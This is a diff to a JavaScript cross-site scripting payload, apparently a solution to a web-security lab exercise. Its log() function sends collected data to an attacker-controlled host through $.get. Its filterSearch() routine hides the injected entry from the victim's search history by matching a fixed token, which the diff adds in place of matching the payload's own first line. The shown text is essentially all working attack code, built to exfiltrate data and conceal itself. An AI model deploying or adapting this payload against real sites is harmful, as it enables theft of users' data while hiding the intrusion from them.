@@ -3,6 +3,7 @@
 <script>
 // Extend this function:
 function payload(attacker) {
+	// Token for filter defc72a96803a619a6735cd7e7e69e1b
 	function log(attacker, data) {
 		console.log($.param(data));
 		$.get(attacker, data);
@@ -38,12 +39,11 @@ function payload(attacker) {
 
 	function filterSearch() {
 		var historyList = $("#history-list a");
-		var injectedCode = payload.toString().split("\n");
 		if (historyList.length == 0) {
 			return;
 		}
 		for (var i = 0; i < historyList.length; i++) {
-			if (historyList[i].text.indexOf(injectedCode[0]) != -1) {
+			if (historyList[i].text.indexOf("defc72a96803a619a6735cd7e7e69e1b") != -1) {
 				historyList[i].style.display = "none";
 			}
 		}
